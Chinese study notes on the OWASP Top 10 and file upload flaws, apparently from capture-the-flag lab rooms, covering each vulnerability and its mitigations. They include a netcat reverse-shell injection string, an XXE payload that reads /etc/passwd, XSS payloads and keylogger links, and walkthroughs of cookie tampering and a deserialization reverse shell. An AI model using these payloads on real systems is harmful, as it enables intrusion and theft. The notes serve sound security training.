    9.具有已知漏洞的组件Components with Known Vulnerabilities
    10.日志记录和监控不足Insufficent Logging & Monitoring



### 1.注入

注入缺陷Injection flaws 在当今的应用程序中非常普遍。出现这些缺陷是因为用户控制的输入被应用程序解释为实际命令或参数。注入攻击取决于所使用的技术以及这些技术对输入的解释方式。

一些常见的例子包括：

|   SQL 注入   | SQL 注入是指攻击者输入恶意或格式错误的查询以检索或篡改数据库中的数据。 在某些情况下，登录帐户。 |
| :----------: | :----------------------------------------------------------: |
|   命令注入   | 命令注入 是指 Web 应用程序获取输入或用户控制的数据并将其作为系统命令运行。因此，攻击者能够在应用程序服务器上执行任意系统命令。攻击者可能会篡改这些数据来执行自己的系统命令。 这可以在执行错误配置的 ping 测试的应用程序中看到。 |
| 电子邮件注入 | 电子邮件注入是一种安全漏洞，允许恶意用户在未经电子邮件服务器事先授权的情况下发送电子邮件。 当攻击者向字段添加额外数据而服务器无法正确解释这些数据时，就会发生这种情况。 |

如果攻击者能够成功传递被正确解释的输入，他们将能够执行以下操作：

    当此输入传递到数据库查询时，访问、修改和删除数据库中的信息。这意味着攻击者可以窃取个人详细信息和凭据等敏感信息。
    在允许攻击者访问用户系统的服务器上执行任意系统命令。这将使他们能够窃取敏感数据，并对链接到执行命令的服务器的基础设施进行更多攻击。

防止注入攻击的主要防御措施是确保用户控制的输入不被解释为查询或命令。有不同的方法可以做到这一点：

    使用允许列表：将输入发送到服务器时，会将此输入与安全输入或字符列表进行比较。如果输入被标记为安全的，那么它就会被处理。否则，它会被拒绝并且应用程序会抛出错误。
    剥离Stripping输入：如果输入包含危险字符，则在处理这些字符之前将其删除。 

危险字符或输入被归类为任何可以改变基础数据处理方式的输入。无需手动构建允许列表或什至只是剥离输入，有各种库可以为您执行这些操作。



**操作系统命令注入**

当 Web 应用程序中的服务器端代码（例如 PHP）在托管计算机上进行系统调用时，就会发生命令注入。这是一个 Web 漏洞，攻击者可以利用该系统调用在服务器上执行操作系统命令。有时，这并不总是以恶意行为结束，例如 whoami 或只是读取文件。但命令注入的问题是它为攻击者提供了许多选择。他们能做的最糟糕的事情就是生成一个反向 shell 来成为 Web 服务器运行的用户。一个简单的 **;nc -e /bin/bash** 就足够了，他们拥有你的服务器；netcat 的某些变体不支持 -e 选项。反向shell的列表您可以使用(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)作为替代方案。一旦攻击者在 Web 服务器上站稳脚跟，他们就可以开始对您的系统进行常规枚举，并开始寻找绕过的方法。现在我们知道什么是命令注入，我们将开始讨论不同的类型以及如何测试它们。



**主动命令注入**

当向服务器发出的系统命令未在 HTML 文档中向用户返回响应时，就会发生盲命令注入。主动命令注入会将响应返回给用户。可以通过多个 HTML 元素使其可见。 

EvilShell (evilshell.php) 代码示例 :

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111174933338.png" alt="image-20231111174933338" style="zoom: 80%;" />

在伪代码中，上面的代码片段执行以下操作：

  1.检查参数“commandString”是否设置

  2.如果是，则变量 $command_string获取传入输入字段的内容

  3.然后程序进入try块执行该函数 passthru($command_string)，一般来说，它执行输入中输入的内容，然后将输出直接传递回浏览器 。

  4.如果尝试不成功，则将错误输出到页面。 一般来说，这不会输出任何内容，因为你无法输出 stderr，但 PHP 不允许你尝试而不进行捕获。

检测主动命令注入的方法

我们知道，当您可以看到系统调用的响应时，就会发生主动命令注入。 在上面的代码中，函数 passthru()实际上就是这里所做的所有工作。 它将响应直接传递到文档，以便您可以在那里看到您的劳动成果。 既然我们知道了这一点，我们就可以检查一些有用的命令来尝试进一步枚举机器。 这里的函数调用为 passthru()可能并不总是幕后发生的事情，但我觉得这是展示漏洞的最简单、最简单的方法。

要尝试的命令

Linux：whoami，id，ifconfig/ip addr，uname -a，ps -ef

Windows：whoami，ver，ipconfig，tasklist，netstat -an

操作系统命令注入

https://portswigger.net/web-security/os-command-injection#:~:text=OS%20command%20injection%20(also%20known,application%20and%20all%20its%20data.





### 2.失效的身份认证

身份验证Authentication和会话管理session management构成了现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序。最常见的身份验证形式是使用用户名和密码机制。用户将输入这些凭据，服务器将验证它们。如果它们是正确的，服务器将向用户的浏览器提供一个会话 cookie。需要会话 cookie，因为 Web 服务器使用无状态的 HTTP(S) 进行通信。附加会话 cookie 意味着服务器将知道谁在发送什么数据。然后服务器可以跟踪用户的操作。

如果攻击者能够发现身份验证机制中的缺陷，他们就可以成功访问其他用户的帐户。这将允许攻击者访问敏感数据（取决于应用程序的目的）。

**身份验证机制中的一些常见缺陷包括：**

    暴力攻击Brute force attacks ：如果Web应用程序使用用户名和密码，则攻击者能够发起暴力攻击，从而允许他们使用多次身份验证尝试来猜测用户名和密码。
    
    使用弱凭证Use of weak credentials ：Web应用程序应设置强密码策略。如果应用程序允许用户设置诸如“password1”或普通密码之类的密码，那么攻击者就能够轻松猜出这些密码并访问用户帐户。他们可以在没有蛮力和多次尝试的情况下做到这一点。
    
    弱会话Cookie Weak Session Cookies ：会话Cookie是服务器跟踪用户的方式。如果会话cookie包含可预测的值，攻击者可以设置他们自己的会话cookie并访问用户的帐户。 



根据确切的缺陷，可以有多种针对损坏的身份验证机制的缓解措施：

    为避免密码猜测攻击，请确保应用程序执行强密码策略。
    为避免暴力攻击，请确保应用程序在一定次数的尝试后强制执行自动锁定。这将防止攻击者发起更多的暴力攻击。
    实施多因素身份验证——如果用户有多种身份验证方法，例如，使用用户名和密码并在他们的移动设备上接收代码，那么攻击者将很难获得这两种凭证的访问权限以访问他们的帐户。



**失效身份验证和会话管理练习**

对于此示例，我们将研究身份验证机制中的逻辑缺陷。很多时候发生的事情是开发人员忘记清理用户在其应用程序代码中提供的输入（用户名和密码），这可能使他们容易受到 SQL 注入等攻击。但是，我们将重点关注由于开发人员的错误而发生但非常容易被利用的漏洞，即现有用户的重新注册（re-registration of an existing user）。

让我们借助一个例子来理解这一点，假设有一个名为 admin的现有用户 ，现在我们想要访问他们的帐户，所以我们可以做的是尝试重新注册该用户名，但稍作修改。我们要输入“admin”（注意开头的空格）。现在，当您在用户名字段中输入它并输入其他必需信息（如电子邮件 ID 或密码）并提交该数据时。它实际上会注册一个新用户，但该用户将拥有与普通管理员相同的权限。该新用户还将能够看到用户 admin下显示的所有内容。





### 3.敏感数据泄露

当 web 应用程序意外泄露敏感数据时，我们将其称为“敏感数据暴露”。这通常是与客户直接相关的数据（例如姓名、出生日期、财务信息等），但也可能是更多技术信息，例如用户名和密码。在更复杂的层面上，这通常涉及诸如“中间人攻击”之类的技术，攻击者将通过他们控制的设备强制用户连接，然后利用对任何传输数据的弱加密来获取对拦截信息的访问权限（如果数据甚至首先被加密......）。当然，许多示例要简单得多，并且可以在 Web 应用程序中找到漏洞，无需任何高级网络知识即可利用这些漏洞。确实，在某些情况下，敏感数据可以直接在网络服务器本身上找到。



**敏感数据泄露（查询 SQLite 数据库中的敏感数据）**

以一种可以同时从多个位置轻松访问的格式存储大量数据的最常见方法是在数据库中。这显然非常适合 Web 应用程序之类的东西，因为可能有许多用户在任何时候与网站交互。数据库引擎通常遵循 Structured Query Language结构化查询语言( SQL) 语法；然而，替代格式（例如 NoSQL）越来越受欢迎。

在生产环境中，通常会看到在专用服务器上设置数据库，运行 MySQL 或 MariaDB 等数据库服务；但是，数据库也可以存储为文件。这些数据库被称为“平面文件”数据库，因为它们作为单个文件存储在计算机上。这比设置完整的数据库服务器要容易得多，因此可能会在较小的 Web 应用程序中看到。访问数据库服务器超出了今天的任务范围，所以让我们关注平面文件数据库。

如前所述，平面文件数据库作为文件存储在计算机磁盘上。通常这对于 webapp 来说不是问题，**但是如果数据库存储在网站的根目录下（即连接到网站的用户能够访问的文件之一），会发生什么情况？**好吧，我们可以下载它并在我们自己的机器上查询它，并且可以完全访问数据库中的所有内容。确实是敏感数据暴露！这是挑战的一个重要提示，所以让我们简要介绍一些用于查询平面文件数据库的语法。

最常见（也是最简单）的平面文件数据库格式是 sqlite 数据库。这些可以在大多数编程语言中进行交互，并且有一个专门的客户端可以在命令行上查询它们。这个客户端叫做“ sqlite3 ”，默认安装在 Kali 上。

假设我们已成功下载数据库： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111181754560.png" alt="image-20231111181754560" style="zoom: 67%;" />

我们可以看到当前文件夹下有一个SQlite数据库。

要访问它，我们使用： sqlite3 <database-name>: 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111181833348.png" alt="image-20231111181833348" style="zoom: 80%;" />

从这里我们可以使用以下命令查看数据库中的表 .tables命令： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111182034386.png" alt="image-20231111182034386" style="zoom: 80%;" />

此时我们可以转储表中的所有数据，但除非查看表信息，否则我们不一定知道每一列的含义。 首先我们来使用 **PRAGMA table_info(customers)**;查看表信息，然后我们将使用 **SELECT * FROM customers**;从表中转储信息： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111182204499.png" alt="image-20231111182204499" style="zoom:67%;" />

从表信息中我们可以看到有四列：custID、custName、creditCard、password。 您可能会注意到这与结果相匹配。

在哈希hash破解方面，在本材料的范围内我们将使用在线工具： Crackstation（https://crackstation.net/）。





### 4.XML 外部实体(XXE)

XML外部实体 XML External Entity (XXE) 攻击是一种滥用 XML 解析器/数据功能的漏洞。它通常允许攻击者与应用程序本身可以访问的任何后端或外部系统进行交互，并且可以允许攻击者读取该系统上的文件。它们还可能导致**拒绝服务Denial of Service (DOS) 攻击**，或者可能**使用 XXE 执行服务器端请求伪造 Server-Side Request Forgery(SSRF)**，诱导 Web 应用程序向其他应用程序发出请求。XXE 甚至可能启用端口扫描并导致远程代码执行。

XXE 攻击有两种类型：带内(in-band) 和带外(out-of-band (OOB-XXE))。

    带内 XXE 攻击是攻击者可以立即收到对XXE负载的响应的攻击。
    
    带外 XXE 攻击（也称为盲XXE），Web应用程序没有立即响应，攻击者必须将其XXE负载的输出反映到其他文件或他们自己的服务器。



#### **XML外部实体 - XML**

XML（可扩展标记语言eXtensible Markup Language）是一种标记语言，它定义了一组规则，用于以人类可读和机器可读的格式对文档进行编码。它是一种用于存储和传输数据的标记语言。

为什么使用 XML？

    1. XML是独立于平台和编程语言的，因此它可以在任何系统上使用，并支持发生技术变化时的变化。
    2. 使用XML存储和传输的数据可以在任何时间点更改而不影响数据表示。
    3. XML允许使用DTD和Schema进行验证。此验证可确保XML文档没有任何语法错误。
    4. XML由于其独立于平台的特性，简化了各种系统之间的数据共享。XML数据在不同系统之间传输时不需要任何转换。

句法

每个 XML 文档大多以所谓的 XML Prolog 开始。

<?xml version="1.0" encoding="UTF-8"?>


该行上方称为 XML 序言，它指定 XML 版本和 XML 文档中使用的编码。 该行不是强制使用的，但将该行放在所有 XML 文档中被认为是“良好实践”。

每个 XML 文档都必须包含一个“ROOT”元素。 例如： 

<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>

在上面的示例中，<mail> 是该文档的 ROOT 元素， <to>, <from>, <subject>, <text> 是子元素。如果 XML 文档没有任何根元素，那么它将被视为错误或无效的 XML 文档。

另一件要记住的事情是 XML 是一种区分大小写的语言。如果一个标签像这样开始 <to> ，那么它必须以 </to> 而不是像 </To>这样的东西结束。

就像 HTML 一样，我们也可以在 XML 中使用属性。具有属性的语法也与 HTML 非常相似。例如：

<text category = "message">You need to learn about XXE</text>

在上面的例子中 category 是属性名， message 是属性值。 



#### **XML 外部实体 - DTD**

DTD 代表文档类型定义Document Type Definition。DTD 定义 XML 文档的结构以及合法元素和属性。

让我们试着借助一个例子来理解这一点。假设我们有一个名为 note.dtd 以下内容的文件：

<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>

现在我们可以使用这个 DTD 来验证一些 XML 文档的信息，并确保 XML 文件符合那个 DTD 的规则。

例如下面给出了一个 XML 文档，它使用 note.dtd：

< ?xml version="1.0" encoding="UTF-8" ? >

< ! DOCTYPE note SYSTEM " note.dtd " >

<note> 

  <to> falcon</to> 

  <from>feast</from> 

  <heading>hacking</heading> 

  <body> XXE攻击</body> 

</note>

那么现在让我们了解 DTD 如何验证 XML。以下是所有这些术语的 note.dtd 意思

    !DOCTYPE note - 定义名为note的文档的根元素 
    !ELEMENT note - 定义 note 元素必须包含元素：“to, from, heading, body”
    !ELEMENT to - 将 to 元素定义为“#PCDATA”类型
    !ELEMENT from - 将 from 元素定义为“#PCDATA”类型
    !ELEMENT heading - 将 heading 元素定义为“#PCDATA”类型
    !ELEMENT body - 将body 元素定义为“#PCDATA”类型
    注意：#PCDATA 表示可解析的字符数据。



#### XML 外部实体 - XXE 负载

现在我们将看到一些 XXE 负载并了解它们是如何工作的。

1，我们将看到的第一个有效负载非常简单。如果您正确阅读了前面的任务，那么您将很容易理解此有效负载。

<!DOCTYPE replace [<!ENTITY name "feast"> ]>

 <userInfo>

 <firstName>falcon</firstName>

 <lastName>&name;</lastName>

 </userInfo>

如我们所见，我们正在定义一个 ENTITY 叫 name 并为其分配一个值 feast。稍后我们将在我们的代码中使用该 ENTITY。

2，我们还可以使用 XXE 通过定义一个 ENTITY 并使用 SYSTEM 关键字从系统中读取一些文件在这里，我们再次定义一个名为 read 的 ENTITY， 但不同之处在于我们将其值设置为“SYSTEM”和文件的路径。如果我们使用此有效负载，那么容易受到 XXE 攻击的网站将显示文件 /etc/passwd 的内容。

<?xml version="1.0"?>

<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>

<root>&read;</root>

以类似的方式，我们可以使用这种有效载荷来读取其他文件，但很多时候您可能无法通过这种方式读取文件，或者失败的原因可能是您正在尝试读取的文件。





### 5.失效的访问控制

网站的页面受到保护，无法访问普通访问者，例如，只有网站的管理员用户才能访问页面以管理其他用户。如果网站访问者能够访问他们无权查看的受保护页面，则访问控制就会被破坏。

普通访问者能够访问受保护的页面，可能会导致以下情况：

    能够查看敏感信息
    访问未经授权的功能 

**OWASP 列出了一些展示访问控制弱点的攻击场景：**

场景 #1： 应用程序在访问帐户信息的 SQL 调用中使用未经验证的数据：

pstmt.setString(1, request.getParameter("acct"));

ResultSet results = pstmt.executeQuery();

攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何帐号。如果没有正确验证，攻击者可以访问任何用户的帐户。

http://example.com/app/accountInfo?acct=notmyacct

场景 #2： 攻击者只是强制浏览到目标 URL。访问管理页面需要管理员权限。

http://example.com/app/getappInfo

http://example.com/app/admin_getappInfo

如果未经身份验证的用户可以访问任何一个页面，那就是一个缺陷。如果非管理员可以访问管理页面，这是一个缺陷。简而言之，破坏的访问控制允许攻击者绕过授权，这可以让他们查看敏感数据或执行任务，就好像他们是特权用户一样。



**失效的访问控制（IDOR 挑战）**

IDOR(Insecure Direct Object Reference)，或不安全的直接对象引用，是利用用户输入处理方式中的错误配置来访问您通常无法访问的资源的行为。IDOR 是一种访问控制漏洞access control vulnerability。

例如，假设我们正在登录我们的银行账户，在正确验证我们自己之后，我们被带到一个像这样的 URL https://example.com/bank?account_number=1234。在该页面上，我们可以看到我们所有重要的银行详细信息，用户可以做他们需要做的任何事情，并继续前进，认为没有任何问题。然而，这里存在一个潜在的大问题，黑客可能能够将 account_number 参数更改为 1235 等其他内容，如果站点配置不正确，那么他就可以访问其他人的银行信息。





### 6.安全配置错误

安全配置错误与其他前 10 大漏洞不同，因为它们发生在本可以正确配置但未正确配置安全性的情况下。

安全配置错误包括：

    对云服务（如 S3 存储桶）的权限配置不当
    启用不必要的功能，例如服务、页面、帐户或权限
    密码未更改的默认帐户
    过于详细的错误消息，使攻击者可以找到有关系统的更多信息
    不使用HTTP安全标头，或在 Server: HTTP header 中透露太多细节

此漏洞通常会导致更多漏洞，例如允许您访问敏感数据的默认凭据、管理页面上的 XXE 或命令注入。

有关更多信息，我建议查看OWASP 安全配置错误的前 10 个条目(https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html)





### 7.跨站点脚本(XSS)

 XSS 跨站点脚本Cross-site scripting，是一种通常在 Web 应用程序中发现的安全漏洞。这是一种注入，可以让攻击者执行恶意脚本并让它在受害者的机器上执行。

如果 Web 应用程序使用未经过滤的用户输入，则它很容易受到 XSS 攻击。XSS 在 Javascript、VBScript、Flash 和 CSS 中是可能的。跨站点脚本主要分为三种类型：

    1.存储型 XSS (Stored XSS) - 最危险的 XSS 类型。这是来自网站数据库的恶意字符串的来源。当网站允许用户输入在插入数据库时未经过清理（删除用户输入的“坏部分”）时，通常会发生这种情况。
    
    2.反射型 XSS (Reflected XSS) - 恶意负载是受害者对网站请求的一部分。该网站包含此有效负载以响应用户。总而言之，攻击者需要诱骗受害者点击一个 URL 来执行他们的恶意负载。
    
    3.基于 DOM 的 XSS - DOM 代表文档对象模型Document Object Model，是 HTML 和XML文档的编程接口。它代表页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，这个文档可以显示在浏览器窗口中，也可以作为 HTML 源文件显示。



**XSS 有效负载**

请记住，跨站点脚本是一个漏洞，可以利用它在受害者的机器上执行恶意 Javascript。

常用的有效负载类型：

    弹出窗口 (<script>alert(“Hello World”)</script>) - 在用户浏览器上创建一个 Hello World 消息弹出窗口。
    
    编写 HTML (document.write) - 覆盖网站的 HTML 以添加您自己的（基本上破坏整个页面）。
    
    XSS键盘记录器 (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - 您可以记录用户的所有击键，捕获他们在网页中输入的密码和其他敏感信息。
    
    端口扫描 (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - 一个迷你本地端口扫描器。

XSS-Payloads.com (http://www.xss-payloads.com/) 是一个拥有 XSS 相关有效载荷、工具、文档等的网站。您可以下载从网络摄像头拍摄快照的 XSS 负载，甚至可以获取功能更强大的端口和网络扫描器。





### 8.不安全的反序列化

不安全的反序列化是一种漏洞，当不受信任的数据被用来滥用应用程序的逻辑时会发生这种情况。这个定义至少可以说还是很宽泛的。**简单地说，不安全的反序列化就是用恶意代码替换应用程序处理的数据**；允许从DoS（拒绝服务 Denial of Service）到 RCE（远程代码执行 Remote Code Execution）的任何东西，攻击者可以利用这些东西在渗透测试场景中获得立足点。

具体来说，此恶意代码利用了 Web 应用程序使用的合法序列化和反序列化过程。我们将解释这个过程以及为什么它在现代 Web 应用程序中如此普遍。

OWASP 将此漏洞评为 10 分中的 8 分，原因如下：

\- 低可利用性。此漏洞通常视具体情况而定——没有可靠的工具/框架。由于其性质，攻击者需要很好地了解 ToE 的内部工作原理。

\- 漏洞利用仅在攻击者的技能允许时才危险，更重要的是，暴露的数据的价值。例如，只能引起DoS的人会使应用程序不可用。这对基础设施的业务影响会有所不同——一些组织会恢复得很好，但其他组织则不会。

**什么是易受攻击的？**

任何存储或获取数据的应用程序都没有对查询或保留的数据进行验证或完整性检查。这种性质的应用的几个例子是：- 电子商务网站 - 论坛 - API's - 应用程序运行时（Tomcat、Jenkins、Jboss 等）

序列化是将编程中使用的对象转换为更简单、兼容的格式，以便在系统或网络之间传输以进行进一步处理或存储的过程。或者，反序列化与此相反；将序列化信息转换成它们的复杂形式——一个应用程序可以理解的对象。



#### **不安全的反序列化 - Cookie**

网站使用这些 cookie 来存储特定于用户的行为

有些 cookie 具有附加属性，下面列出了其中的一小部分： 

| 属性               | 描述                                        | 是否必要 |
| ------------------ | ------------------------------------------- | -------- |
| Cookie 名称        | 要设置的 Cookie 的名称                      | 是       |
| Cookie 值          | 值，这可以是任何明文或编码                  | 是       |
| Secure Only 仅安全 | 如果设置，此 cookie 将仅通过 HTTPS 连接设置 | 否       |
| Expiry 到期        | 设置将从浏览器中删除 cookie 的时间          | 否       |
| Path 路径          | 仅当指定的 URL 在请求中时才会发送 cookie    | 否       |

﻿创建 Cookie 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111234228442.png" alt="image-20231111234228442" style="zoom:67%;" />

在 Flask 中设置 cookie 相当简单。 简单地说，此代码片段获取当前日期和时间，将其存储在变量“timestamp”中，然后将日期和时间存储在名为“registrationTimestamp”的 cookie 中

这就是它在浏览器中的样子

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111234319882.png" alt="image-20231111234319882" style="zoom:67%;" />



**不安全的反序列化 - Cookies 实用**

第一个标志（cookie 值）？{我们必须去示例网站，让我们创建一个帐户，您将被定向到您的个人资料页面的位置。注意右边，你有你的详细信息。右键单击页面，然后按“检查元素”。导航到“存储”选项卡。检查编码数据，你会在这里看到有 cookie 是明文编码和 base64 编码的。第一个标志将在其中一个 cookie 中找到。}

第二个标志（管理仪表板）{修改 Cookie 值，请注意，您有一个名为“userType”的 cookie。正如您在“我的个人资料”页面上的信息所确认的那样，您目前是一名用户。此应用程序根据您的用户类型确定您可以看到和不能看到的内容。如果您想成为管理员怎么办？双击“userType”的“Value”栏修改内容。让我们将我们的用户类型更改为“admin”并导航到http://10.10.83.1/admin以回答第二个标志。}

 

#### 不安全的反序列化——代码执行

首先，将 userType cookie 的值从“admin”更改为“user”并返回到http://<machine-IP>/myprofile。然后，左键单击“Exchange your vim”中的 URL。接下来，左键单击“提供您的反馈！”中的 URL。

如果用户要输入反馈，数据将被编码并发送到 Flask 应用程序（例如可能存储在数据库中）。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111234952545.png" alt="image-20231111234952545" style="zoom: 33%;" />



当您访问“交换您的 vim”URL 时，Cookie 会被编码并存储在您的浏览器中 - 非常适合我们修改。一旦您访问反馈表，该 cookie 的值就会被解码，然后反序列化。在下面的代码片段中，我们可以看到如何检索 cookie，然后通过以下方式反序列化： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111235054856.png" alt="image-20231111235054856" style="zoom: 33%;" />

在 Kali 上设置一个 netcat 监听器：

![image-20231111235257354](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111235257354.png)



由于反序列化的代码来自 base64 格式，因此我们不能简单地生成反向 shell。 我们必须对自己的命令进行 Base64 编码，以便执行恶意代码。使用以下代码创建一个名为 rce.py 的 python 文件，但将 VPN IP 替换为您的 IP：

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111234726480.png" alt="image-20231111234726480" style="zoom:67%;" />

执行“rce.py”：python3 rce.py

注意命令的输出，它看起来类似于： 

![image-20231111235510665](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111235510665.png)

复制并粘贴 两个语音标记（“数据”）之间的 所有内容，只需确保复制两个 ''之间的所有内容即可。将其粘贴到浏览器中的encodedPayload cookie 中：

![image-20231111235718750](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231111235718750.png)

现在将 cookie 的值更改为生成的值（每个人都会不同），然后重新加载页面。确保我们的 netcat 侦听器仍在运行，现在，我们回到设置 netcat 侦听器的终端窗口。你知道吗，我们现在有一个反向 shell 。





### **9.具有已知漏洞的组件**

有时，您可能会发现您正在进行渗透测试的公司/实体使用的程序已经有充分记录的漏洞。

例如，假设一家公司几年没有更新他们的 WordPress 版本，并且使用诸如 wpscan 之类的工具，您发现它是 4.6 版。一些快速研究将揭示 WordPress 4.6 容易受到未经身份验证的远程代码执行 (RCE) 攻击，甚至更好的是，您可以找到已经在exploit-db上进行的攻击 。

正如您所看到的，这将是非常具有破坏性的，因为它需要攻击者做很少的工作，因为漏洞已经众所周知，其他人已经利用了该漏洞。当您意识到这种情况真的很容易发生时，情况会变得更糟，如果一家公司错过了他们使用的程序的一次更新，他们可能容易受到任何数量的攻击。

**具有已知漏洞的组件 - 漏洞利用**

回想一下，因为这是关于已知漏洞的，所以大部分工作已经为我们完成了。我们的主要工作是找出软件的信息，并对其进行研究，直到找到漏洞。让我们通过一个示例 Web 应用程序来了解一下。你知道吗，这个服务器正在使用 nostromo 网络服务器的默认页面。现在我们有了版本号和软件名称，我们可以使用 exploit-db（https://www.exploit-db.com/）来尝试找到这个特定版本的漏洞。





### 10.日志记录和监控不足

设置 Web 应用程序时，应记录用户执行的每个操作。日志记录很重要，因为在发生事件时，可以跟踪攻击者的行为。一旦追踪到他们的行为，就可以确定他们的风险和影响。如果没有日志记录，就无法判断攻击者在获得对特定 Web 应用程序的访问权限后执行了哪些操作。其中更大的影响包括：

    监管损害：如果攻击者获得了对用户个人身份信息的访问权限并且没有记录，不仅应用程序的用户会受到影响，应用程序所有者也可能会根据法规受到罚款或更严厉的处罚。
    进一步攻击的风险：如果不进行日志记录，则可能无法检测到攻击者的存在。这可能允许攻击者通过窃取凭据、攻击基础设施等方式对Web应用程序所有者发起进一步的攻击。 

日志中存储的信息应包括：

    HTTP状态码
    Time Stamps
    用户名
    API 端点/页面位置
    IP地址

这些日志确实包含一些敏感信息，因此确保安全存储日志并将这些日志的多个副本存储在不同位置非常重要。

您可能已经注意到，在发生违规或事件后，日志记录更为重要。理想的情况是进行监控以检测任何可疑活动。检测此可疑活动的目的是完全阻止攻击者，或者如果检测到攻击者的存在比预期晚得多，则可以减少他们造成的影响。可疑活动的常见示例包括：

    多次未经授权的特定操作尝试（通常是身份验证尝试或访问未经授权的资源，例如管理页面）
    来自异常 IP 地址或位置的请求：虽然这可能表明其他人正在尝试访问特定用户的帐户，但它也可能具有误报率。
    使用自动化工具：可以很容易地识别特定的自动化工具，例如使用用户代理标头的值或请求的速度。这可能表明攻击者正在使用自动化工具。
    常见有效载荷：在 Web 应用程序中，攻击者通常使用跨站点脚本 (XSS) 有效载荷。检测这些有效载荷的使用可以表明有人在对应用程序进行未经授权/恶意测试。 

仅仅检测可疑活动是没有帮助的。需要根据影响级别对这种可疑活动进行评级。例如，某些行动会比其他行动产生更大的影响。这些影响较大的行动需要尽快做出回应，因此它们应该发出警报，引起相关方的注意。









## 文件上传漏洞 

如果处理不当，文件上传也会在服务器中造成严重的漏洞。 这可能会导致任何问题，从相对较小的、令人讨厌的问题，如果攻击者设法上传并执行 shell，则一直到完整的远程代码执行 (RCE)。通过对服务器的不受限制的上传访问（以及随意检索数据的能力），攻击者可以破坏或以其他方式更改现有内容，甚至包括注入恶意网页，从而导致进一步的漏洞，例如 XSS 或 CSRF。 通过上传任意文件，攻击者还可能使用服务器托管和提供非法内容，或泄露敏感信息。 实际上，攻击者能够将他们选择的文件上传到您的服务器（没有任何限制）确实非常危险。

这个房间的目的是探索由于文件上传处理不当（或不充分）而导致的一些漏洞。 具体来说，我们将关注：

    覆盖服务器上的现有文件
    在服务器上上传并执行Shell
    绕过客户端过滤
    绕过各种服务器端过滤
    欺骗内容类型验证检查 

**我们在网站上有一个文件上传点，我们将如何利用它？**

与任何类型的黑客攻击一样，枚举是关键。 我们对环境了解得越多，我们就能利用 它做 更多的事情。 查看页面的源代码可以很好地了解是否应用了任何类型的客户端过滤。 使用 Gobuster 等目录暴力破解程序进行扫描通常有助于网络攻击，并可能揭示文件上传到的位置。使用 Burpsuite 拦截上传请求也会派上用场。Wappalyser 等浏览器扩展可以提供有关您所定位的网站的有价值的信息。

对网站如何处理我们的输入有了基本的了解后，我们就可以尝试浏览一下，看看我们可以上传什么，不能上传什么。 如果网站采用客户端过滤，那么我们可以轻松查看过滤器的代码并尝试绕过它。如果网站有服务器端过滤，那么我们可能需要猜测过滤器正在寻找什么，上传文件，然后在上传失败时根据错误消息尝试稍微不同的操作。 上传旨在引发错误的文件可以帮助解决此问题。 Burpsuite 或 OWASP Zap 等工具在此阶段非常有帮助。





### 覆盖现有文件 

当文件上传到服务器时，应执行一系列检查以确保文件不会覆盖服务器上已存在的任何内容。 常见的做法是为文件分配一个新名称——通常是随机的，或者将上传的日期和时间添加到原始文件名的开头或结尾。 或者，可以应用检查来查看文件名是否已存在于服务器上； 如果同名文件已存在，则服务器将返回一条错误消息，要求用户选择不同的文件名。 在保护现有文件不被覆盖时，文件权限也会发挥作用。 例如，网页不应该对网络用户可写，从而防止它们被攻击者上传的恶意版本覆盖。
但是，如果不采取此类预防措施，那么我们可能会覆盖服务器上的现有文件。 实际上，服务器上的文件权限很可能会防止这是一个严重的漏洞。 也就是说，它仍然可能很麻烦，并且值得在渗透测试或 bug 狩猎环境中予以关注。 





### 远程代码执行 

覆盖服务器上存在的文件一切都很好。 这对于维护站点的人员来说是一件麻烦事，并且可能会导致一些漏洞，但让我们更进一步； 让我们来进行 RCE 吧。

远程代码执行允许我们在 Web 服务器上任意执行代码。 虽然这可能是一个低权限的 Web 用户帐户（例如 www-data在 Linux 服务器上），它仍然是一个极其严重的漏洞。 通过 Web 应用程序中的上传漏洞执行远程代码往往会通过上传与网站后端相同的语言（或服务器理解并执行的其他语言）编写的程序来利用。 传统上，这将是 PHP，但是最近，其他后端语言变得更加常见（Python、Django 和 Node.js 形式的 Javascript 就是主要例子）。 值得注意的是，在路由应用程序（即以编程方式定义路由而不是映射到文件系统的应用程序）中，这种攻击方法变得更加复杂，并且发生的可能性也大大降低。 大多数现代 Web 框架都是以编程方式路由的。

